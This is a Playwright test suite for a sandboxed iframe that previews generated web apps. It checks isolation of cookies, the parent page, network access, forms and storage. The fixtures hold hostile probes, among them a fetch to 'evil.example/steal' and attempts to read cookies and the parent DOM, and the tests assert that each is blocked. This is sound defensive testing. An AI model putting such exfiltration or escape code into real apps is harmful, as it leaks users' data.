import { expect, test } from '@playwright/test';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

// REAL React component and browser sandbox; artifact bytes are SIMULATED fixtures.
const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
let directory: string;
let server: Server;
let base: string;
let bundle = '';
const HTML = `<!doctype html><html><head><title>Todo fixture</title><script>
window.initialSaved = localStorage.getItem('tasks');
</script></head><body><h1>My tasks</h1><form id="add"><input aria-label="New task"><button>Add task</button></form><ul></ul>
<script>
var tasks = JSON.parse(localStorage.getItem('tasks') || '[]');
function show() { document.querySelector('ul').replaceChildren(...tasks.map(function(text) { var item=document.createElement('li'); item.textContent=text; return item; })); }
document.querySelector('form').addEventListener('submit', function(e) { e.preventDefault(); tasks.push(document.querySelector('input').value); localStorage.setItem('tasks', JSON.stringify(tasks)); document.querySelector('input').value=''; show(); });
show();
</script></body></html>`;

const storageKey = (actor: string, project: string) => `caddie:preview:${actor}:${project}`;

test.beforeAll(async () => {
	directory = mkdtempSync(join(tmpdir(), 'caddie-interactive-preview-'));
	const out = join(directory, 'harness.js');
	execFileSync('bun', ['build', join(ROOT, 'tests/fixtures/interactive-preview-harness.tsx'), '--outfile', out, '--format', 'esm', '--target', 'browser'], { cwd: ROOT, stdio: 'pipe' });
	bundle = readFileSync(out, 'utf8');
	server = createServer((request, response) => {
		response.setHeader('content-type', request.url === '/harness.js' ? 'text/javascript' : 'text/html');
		response.end(request.url === '/harness.js' ? bundle : '<!doctype html><html><body><div id="root"></div><script type="module" src="/harness.js"></script></body></html>');
	});
	await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
	const address = server.address();
	if (!address || typeof address === 'string') throw new Error('Preview fixture server failed to start.');
	base = `http://127.0.0.1:${address.port}`;
});
test.afterAll(async () => {
	if (server) await new Promise<void>((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
	if (directory) rmSync(directory, { recursive: true, force: true });
});

test('generated app runs, saves its own storage, and reads it before its first script after reload', async ({ page }) => {
	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML }));
	await page.goto(base);
	const frame = page.frameLocator('iframe');
	await frame.getByRole('textbox', { name: 'New task' }).fill('Build Caddie');
	await frame.getByRole('button', { name: 'Add task' }).click();
	await expect(frame.getByRole('listitem')).toHaveText('Build Caddie');
	await frame.getByRole('textbox', { name: 'New task' }).fill('Keyboard task');
	await frame.getByRole('textbox', { name: 'New task' }).press('Enter');
	await expect(frame.getByRole('listitem')).toHaveText(['Build Caddie', 'Keyboard task']);
	await expect.poll(() => page.evaluate(`localStorage.getItem('${storageKey('actor-one', 'project-one')}')`)).toContain('Keyboard task');
	await page.reload();
	await expect(frame.getByRole('listitem')).toHaveText(['Build Caddie', 'Keyboard task']);
	const generated = page.frames().find(item => item.name() === 'caddie-interactive-preview')!;
	expect(await generated.evaluate('window.initialSaved')).toBe('["Build Caddie","Keyboard task"]');
	await page.goto(`${base}/?project=project-two`);
	await expect(page.frameLocator('iframe').getByRole('listitem')).toHaveCount(0);
	await page.goto(`${base}/?actor=actor-two`);
	await expect(page.frameLocator('iframe').getByRole('listitem')).toHaveCount(0);
});

test('opaque sandbox blocks parent cookies, parent DOM, network, nested frames and forms', async ({ page, context }) => {
	await context.addCookies([{ name: 'caddie-secret', value: 'never-share-this', url: base }]);
	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML }));
	await page.goto(base);
	await expect(page.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts allow-forms');
	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('My tasks');
	const generated = page.frames().find(item => item.name() === 'caddie-interactive-preview')!;
	expect(await generated.evaluate(`(() => { try { return document.cookie; } catch(e) { return e.name; } })()`)).toBe('SecurityError');
	expect(await generated.evaluate(`(() => { try { return parent.document.body.innerHTML; } catch(e) { return e.name; } })()`)).toBe('SecurityError');
	expect(await generated.evaluate(`fetch('${base}/api/private').then(() => 'allowed').catch(() => 'blocked')`)).toBe('blocked');
	const policy = await generated.evaluate(`document.querySelector('meta[http-equiv="Content-Security-Policy"]').content`);
	expect(policy).toContain("frame-src 'none'");
	expect(policy).toContain("form-action 'none'");
	await generated.evaluate(`window.formViolations = []; document.addEventListener('securitypolicyviolation', event => window.formViolations.push(event.violatedDirective)); var form = document.createElement('form'); form.action = '${base}/api/private-form'; form.method = 'POST'; document.body.appendChild(form); form.submit();`);
	await expect.poll(() => generated.evaluate('window.formViolations')).toContain('form-action');
	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('My tasks');

	expect(await page.evaluate('document.cookie')).toContain('never-share-this');
});

test('resource tags are never parsed in the parent and cannot request private app URLs', async ({ page }) => {
	let privateReads = 0;
	await page.route('**/api/private-resource', route => { privateReads++; return route.fulfill({ contentType: 'text/html', body: 'private' }); });
	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML + '<img src="/api/private-resource"><iframe src="/api/private-resource"></iframe>' }));
	await page.goto(base);
	await expect(page.frameLocator('iframe[name="caddie-interactive-preview"]').getByRole('heading')).toHaveText('My tasks');
	const generated = page.frames().find(item => item.name() === 'caddie-interactive-preview')!;
	await generated.evaluate('new Promise(resolve => setTimeout(resolve, 100))');
	expect(privateReads).toBe(0);
});

test('storage bridge rejects the wrong window, wrong nonce and oversized records', async ({ page }) => {
	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML }));
	await page.goto(base);
	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('My tasks');
	const generated = page.frames().find(item => item.name() === 'caddie-interactive-preview')!;
	await generated.evaluate(`parent.postMessage({ kind: 'caddie-preview-storage', nonce: 'wrong-nonce', storage: { bad: 'value' } }, '*')`);
	const nonce = await generated.evaluate(`document.querySelector('script').textContent.match(/var nonce = "([^"]+)"/)[1]`);
	await page.evaluate(`window.postMessage({ kind: 'caddie-preview-storage', nonce: '${nonce}', storage: { bad: 'value' } }, '*')`);
	await generated.evaluate(`parent.postMessage({ kind: 'caddie-preview-storage', nonce: '${nonce}', storage: { bad: 'x'.repeat(102401) } }, '*')`);
	await generated.evaluate(`localStorage.setItem('legitimate', 'saved')`);
	await expect.poll(() => page.evaluate(`localStorage.getItem('${storageKey('actor-one', 'project-one')}')`)).toBe('{"legitimate":"saved"}');
	await expect(generated.evaluate(`(() => { try { localStorage.setItem('huge', 'x'.repeat(102401)); return 'allowed'; } catch(e) { return e.name; } })()`)).resolves.toBe('QuotaExceededError');
	await generated.evaluate(`localStorage.setItem('', 'empty key'); localStorage.extra = 'property'; window.storageShape = [localStorage.getItem('extra'), Object.keys(localStorage).includes('extra'), localStorage.length, localStorage.key(1)]; delete localStorage.extra;`);
	expect(await generated.evaluate('window.storageShape')).toEqual(['property', true, 3, '']);
});

test('failed access has a visible retry; custom workflow content is fetched and download remains explicit', async ({ page }) => {
	let reads = 0;
	await page.route('**/api/projects/project-one/workflow/preview/output-one', route => {
		reads++;
		return reads === 1 ? route.fulfill({ status: 403, body: 'denied' }) : route.fulfill({ contentType: 'text/html', body: HTML });
	});
	await page.goto(`${base}/?workflow=1`);
	await expect(page.getByRole('alert')).toContainText('You do not have access');
	await page.getByRole('button', { name: 'Try again' }).click();
	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('My tasks');
	await expect(page.getByRole('link', { name: 'Download app' })).toHaveAttribute('href', '/api/projects/project-one/workflow/preview/output-one?download=1');
	expect(reads).toBe(2);
});

test('non-HTML artifacts fail closed rather than execute as an app', async ({ page }) => {
	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/plain', body: '<script>alert(1)</script>' }));
	await page.goto(base);
	await expect(page.getByRole('alert')).toContainText('not an interactive app preview');
	await expect(page.locator('iframe')).toHaveCount(0);
});

// --- apps with a server (Publish stage 2/3): the relay -------------------------
// The generated app calls fetch('/api/...'); the opaque frame has no network,
// so the component relays each call to Caddie's relay endpoint (SIMULATED here
// by page.route, standing in for the Worker Loader runtime that
// tests/preview-runtime.integration.test.ts covers under real workerd).

const BACKEND_HTML = `<!doctype html><html><body><h1>Field notes</h1>
<form id="add"><input aria-label="New note"><button>Save note</button></form><ul></ul><p id="status"></p><p id="egress"></p>
<script>
async function load() { const res = await fetch('/api/notes'); const notes = await res.json(); document.querySelector('ul').replaceChildren(...notes.map(function (n) { var li = document.createElement('li'); li.textContent = n.body; return li; })); document.querySelector('#status').textContent = 'loaded ' + res.status; }
document.querySelector('form').addEventListener('submit', async function (e) { e.preventDefault(); const body = document.querySelector('input').value; const res = await fetch('/api/notes', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ body: body }) }); document.querySelector('#status').textContent = 'saved ' + res.status; document.querySelector('input').value = ''; await load(); });
fetch('https://evil.example/steal').then(function () { document.querySelector('#egress').textContent = 'reached'; }, function (error) { document.querySelector('#egress').textContent = 'refused: ' + error.message; });
load();
</script></body></html>`;

test('an app with a server reads and writes through the relay and keeps its own cookie', async ({ page }) => {
	const notes: string[] = [];
	const relayed: Array<{ method: string; path: string; headers: Array<[string, string]>; body: string | null }> = [];
	let resets = 0;
	await page.route('**/api/projects/project-one/workflow/preview/output-one', (route) => route.fulfill({ contentType: 'text/html', body: BACKEND_HTML }));
	await page.route('**/api/projects/project-one/workflow/preview-data/reset', (route) => {
		resets += 1;
		notes.length = 0;
		return route.fulfill({ contentType: 'application/json', body: '{"reset":true}' });
	});
	await page.route('**/api/projects/project-one/workflow/preview/output-one/app', async (route) => {
		const request = route.request().postDataJSON() as (typeof relayed)[number];
		relayed.push(request);
		const json = (status: number, value: unknown, extra: Array<[string, string]> = []) =>
			route.fulfill({
				contentType: 'application/json',
				body: JSON.stringify({ status, headers: [['content-type', 'application/json'], ...extra], body: Buffer.from(JSON.stringify(value)).toString('base64') }),
			});
		if (request.method === 'POST' && request.path === '/api/notes') {
			notes.push(JSON.parse(Buffer.from(request.body ?? '', 'base64').toString('utf8')).body);
			return json(201, { id: notes.length }, [['set-cookie', 'sid=abc123; Path=/; HttpOnly']]);
		}
		if (request.method === 'GET' && request.path === '/api/notes') return json(200, notes.map((body) => ({ body })));
		return json(404, { error: 'not_found' });
	});

	await page.goto(`${base}/?backend`);
	if (process.env.CADDIE_SHOTS_MOBILE) await page.setViewportSize({ width: 390, height: 844 });
	const frame = page.frameLocator('iframe');
	await expect(frame.locator('#status')).toHaveText('loaded 200');
	await expect(page.getByTestId('preview-test-data-note')).toContainText('test data that only you see');

	await frame.getByRole('textbox', { name: 'New note' }).fill('Plant maize after rain');
	await frame.getByRole('button', { name: 'Save note' }).click();
	await expect(frame.getByRole('listitem')).toHaveText(['Plant maize after rain']);
	await expect(frame.locator('#status')).toHaveText('loaded 200');
	if (process.env.CADDIE_SHOTS)
		await page.screenshot({ path: join(process.env.CADDIE_SHOTS, `backend-preview${process.env.CADDIE_SHOTS_MOBILE ? '-mobile' : ''}.png`), fullPage: true });

	// The POST carried its JSON body; the next request carried the app's own cookie.
	const post = relayed.find((r) => r.method === 'POST')!;
	expect(post.headers.find(([name]) => name === 'content-type')?.[1]).toContain('application/json');
	const afterPost = relayed[relayed.indexOf(post) + 1]!;
	expect(afterPost.headers.find(([name]) => name === 'cookie')?.[1]).toBe('sid=abc123');
	// Caddie's own session cookie is never part of a relayed request.
	expect(relayed.every((r) => !r.headers.some(([name, value]) => name === 'cookie' && value.includes('caddie')))).toBe(true);

	// Other sites stay unreachable from the frame.
	await expect(frame.locator('#egress')).toContainText("refused: The preview can only reach the app's own /api routes.");
	expect(relayed.some((r) => r.path.includes('steal'))).toBe(false);

	// Reset test data empties it and reloads the app.
	await page.getByTestId('preview-reset-data').click();
	await expect.poll(() => resets).toBe(1);
	await expect(frame.getByRole('listitem')).toHaveCount(0);
	await expect(frame.locator('#status')).toHaveText('loaded 200');
});

test('a relay failure reaches the app as a network error, not a crash', async ({ page }) => {
	await page.route('**/api/projects/project-one/workflow/preview/output-one', (route) => route.fulfill({ contentType: 'text/html', body: BACKEND_HTML }));
	await page.route('**/api/projects/project-one/workflow/preview/output-one/app', (route) =>
		route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ error: 'PREVIEW_RUNTIME_UNAVAILABLE', message: "Trying apps with a server needs Cloudflare's Worker Loader, which isn't available here." }) }),
	);
	const errors: string[] = [];
	page.on('pageerror', (error) => errors.push(error.message));
	await page.goto(`${base}/?backend`);
	await expect(page.frameLocator('iframe').getByRole('heading', { name: 'Field notes' })).toBeVisible();
	await expect(page.frameLocator('iframe').locator('#status')).toHaveText('');
	// The sample app does not catch its own failed fetch, so the browser reports the
	// rejection — carrying Caddie's plain explanation, exactly like a network error.
	await expect.poll(() => errors).toContain("Trying apps with a server needs Cloudflare's Worker Loader, which isn't available here.");
	// Caddie's own page keeps working around the preview.
	await expect(page.getByRole('link', { name: 'Download app' })).toBeVisible();
});

// A tiny WebAssembly module whose answer() returns 42.
const WASM_BYTES = '[0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,10,1,6,97,110,115,119,101,114,0,0,10,6,1,4,0,65,42,11]';
const WASM_HTML = `<!doctype html><html><head><title>WebAssembly fixture</title></head><body><h1>Waiting</h1><script>
var heading = document.querySelector('h1');
var evalState;
try { eval('1 + 1'); evalState = 'eval ran'; } catch (error) { evalState = 'eval blocked'; }
WebAssembly.instantiate(new Uint8Array(${WASM_BYTES})).then(
	function (result) { heading.textContent = 'WebAssembly ran: ' + result.instance.exports.answer() + ', ' + evalState; },
	function () { heading.textContent = 'WebAssembly blocked, ' + evalState; });
</script></body></html>`;

test('an app in the preview can run WebAssembly, but not JavaScript eval (owner OK, 2026-10-20)', async ({ page }) => {
	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: WASM_HTML }));
	await page.goto(base);
	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('WebAssembly ran: 42, eval blocked');
});
